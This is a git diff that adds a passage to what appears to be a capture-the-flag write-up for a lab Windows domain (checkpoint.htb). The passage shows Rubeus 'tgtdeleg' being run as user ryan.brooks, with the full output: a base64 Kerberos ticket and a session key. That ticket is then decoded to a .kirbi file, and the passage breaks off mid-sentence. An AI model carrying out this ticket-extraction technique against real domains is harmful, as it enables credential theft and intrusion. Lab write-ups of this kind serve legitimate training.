@@ -302,7 +302,44 @@ This shell is running as `ryan.brooks`
 
 # Compromising `ryan.brooks` 
 
-I do no have ha
+I do no have creds for this user, but i can upload rubeus and get a kirbi then convert that to a TGT
+
+```python
+PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3 
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: tKADHXJaQ53n40dMCJlxvBwZcKZ/SDons89Km6rIFwo=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRupZmAzPN4Hq6gkrxzXIp/Cczmq+QWBZ4hSOOVhkyZXZzJMKD0Kai4WnSeoHnK+psuS85pE6sLPRLtM9siVuUKYOg4HRYpsEfPzFJX/e9DudRSzg596JMe1QqH8hxNPlvQX/5loC+M6YJJ6PGnyhMxIjnTRB95kQ8L6lh9Lsx9nVp6+CBSVgIoJD7695Xw4tKIk+g6yH8miF7n74pGza9atgqW6ZNoqeMOm1ptpBfUmeMsIBKl1OL+fn+HNz0ZUe/7tim8a94jXMgZ7fTDzKcitFElwV5uLR+1prGrsWkq+BCbToNwrHUFTMZVZu+lZxV6hcZyRPbP6upvsZdneH198PsOWirdOdVgmXelTLiec1C8B0dPHrMd/6DsbhuN1mlsHOOO9+u7yU8EpcgCTl0gaOXsfI3dwB8ILUWOP+oCMsPawAK28HeAhBGnTF7K9ZU5qPQwkzfM+q65MPokJdtwPwCUQVzH1PGAJQDPPmltSqpPbMbhvTq0xIF6dWXtpk45+nMVqrV8EVFixzRnPORoWJrkr0a+gHqDqenYBvIfTg9I/sll6lYR4ApDVlGBXMnIuAjd6cfTlnZbAPYKEzi7wv+6xUJoqx7u5Ila3l+QlPMx4jB+GPb+AcKZdoyFLVqbioHVr4y2pzFUOXwdbYJrUjGrb8EcN24RlVl5BCsS5NxKY+lvShJM1I2HdJvz93FkhSEp9nNMZuwjGnux9sXGG51LrmcrJ/zZE9bxWrTIuSqI7+qBj97pFMka1x/bfxcMyp4CQz9T30evoY1HejtOxpj17EwyEwX+qKDJXC43BU47BcWBlX8JZMYX8GeglX8ORBwh4CWZ6DEXGCYmhxSFmoOYuoTFzcLSsmMKv7iT4KWselKZjHCXtsoxzrZY0BU08h+wGH6IZEhankQ4z/aeuK645r/7Mi+OVZ/r+V3l/BNCWtgD3whcZq3FB0K1uGA4HSRkT/s0GHXBzg6XbC/S2T/U2WfOUMK8QyyKIKqAXB3leDsmGoo2UaDHzpCRl6QG+0FVglbTyF2vR8SzWUSX17a9/AcVHymQXSX2s0hxv874IPQ0iJG2dq/36pDIcAXWMO+5pv6557S5pz3vGBva+aIXW6DGtzbZ1Fsj9y2AJgGhWndDo5x8GR6kUC0wU2Bvcv5U9mJ5rtdyukWzSNmoWKLAM0P8EjD3J+DcPWMQVXjn1htVgMoGxuEIBsFMIhGYpv4aqdkQAsvEgi1JGNHwF0mDnk2W204UsCl57ZXo2i2IT5RXv/xu1D+JnwNoUOt7LygUr2FFte3OiU5xlYmwxVWHhqHX3I0Iexf6SnVbbuMx79dbP5kZE6YeNMByciiDfYJewu6mmulACIm01d0tdLBH5LSQIqeSRFfkjyT3Cfh3z0U7fZlIZZesKYwT+mgvpr089XiDzk0ir0IKG/UtQ+7dXtHb8qg48SW8ic2a2A2X3Nvxrw3tOzIxuPANlhWh4COG7YzLW0gJn0Bq3ICAw4YHq3UXAa//otjb9A7Zo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg8Shms8dz0FZOAEi+Cz1B0LQCKt/uOGm9ax3g/nlHWwihEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAyOTAwNDM1M1qmERgPMjAyNjEwMjkxMDQzNTNapxEYDzIwMjYxMTA1MDA0MzUzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
+PS C:\Users\ryan.brooks\Desktop> 
+```
+
+Ill get a kirbi
+
+```python
+❯❯❯ echo 'doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRupZmAzPN4Hq6gkrxzXIp/Cczmq+QWBZ4hSOOVhkyZXZzJMKD0Kai4WnSeoHnK+psuS85pE6sLPRLtM9siVuUKYOg4HRYpsEfPzFJX/e9DudRSzg596JMe1QqH8hxNPlvQX/5loC+M6YJJ6PGnyhMxIjnTRB95kQ8L6lh9Lsx9nVp6+CBSVgIoJD7695Xw4tKIk+g6yH8miF7n74pGza9atgqW6ZNoqeMOm1ptpBfUmeMsIBKl1OL+fn+HNz0ZUe/7tim8a94jXMgZ7fTDzKcitFElwV5uLR+1prGrsWkq+BCbToNwrHUFTMZVZu+lZxV6hcZyRPbP6upvsZdneH198PsOWirdOdVgmXelTLiec1C8B0dPHrMd/6DsbhuN1mlsHOOO9+u7yU8EpcgCTl0gaOXsfI3dwB8ILUWOP+oCMsPawAK28HeAhBGnTF7K9ZU5qPQwkzfM+q65MPokJdtwPwCUQVzH1PGAJQDPPmltSqpPbMbhvTq0xIF6dWXtpk45+nMVqrV8EVFixzRnPORoWJrkr0a+gHqDqenYBvIfTg9I/sll6lYR4ApDVlGBXMnIuAjd6cfTlnZbAPYKEzi7wv+6xUJoqx7u5Ila3l+QlPMx4jB+GPb+AcKZdoyFLVqbioHVr4y2pzFUOXwdbYJrUjGrb8EcN24RlVl5BCsS5NxKY+lvShJM1I2HdJvz93FkhSEp9nNMZuwjGnux9sXGG51LrmcrJ/zZE9bxWrTIuSqI7+qBj97pFMka1x/bfxcMyp4CQz9T30evoY1HejtOxpj17EwyEwX+qKDJXC43BU47BcWBlX8JZMYX8GeglX8ORBwh4CWZ6DEXGCYmhxSFmoOYuoTFzcLSsmMKv7iT4KWselKZjHCXtsoxzrZY0BU08h+wGH6IZEhankQ4z/aeuK645r/7Mi+OVZ/r+V3l/BNCWtgD3whcZq3FB0K1uGA4HSRkT/s0GHXBzg6XbC/S2T/U2WfOUMK8QyyKIKqAXB3leDsmGoo2UaDHzpCRl6QG+0FVglbTyF2vR8SzWUSX17a9/AcVHymQXSX2s0hxv874IPQ0iJG2dq/36pDIcAXWMO+5pv6557S5pz3vGBva+aIXW6DGtzbZ1Fsj9y2AJgGhWndDo5x8GR6kUC0wU2Bvcv5U9mJ5rtdyukWzSNmoWKLAM0P8EjD3J+DcPWMQVXjn1htVgMoGxuEIBsFMIhGYpv4aqdkQAsvEgi1JGNHwF0mDnk2W204UsCl57ZXo2i2IT5RXv/xu1D+JnwNoUOt7LygUr2FFte3OiU5xlYmwxVWHhqHX3I0Iexf6SnVbbuMx79dbP5kZE6YeNMByciiDfYJewu6mmulACIm01d0tdLBH5LSQIqeSRFfkjyT3Cfh3z0U7fZlIZZesKYwT+mgvpr089XiDzk0ir0IKG/UtQ+7dXtHb8qg48SW8ic2a2A2X3Nvxrw3tOzIxuPANlhWh4COG7YzLW0gJn0Bq3ICAw4YHq3UXAa//otjb9A7Zo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg8Shms8dz0FZOAEi+Cz1B0LQCKt/uOGm9ax3g/nlHWwihEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAyOTAwNDM1M1qmERgPMjAyNjEwMjkxMDQzNTNapxEYDzIwMjYxMTA1MDA0MzUzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=' | base64 -d | tee ryan.brooks.kirbi
+```
+
+Ill then put this into a .
 
 
 
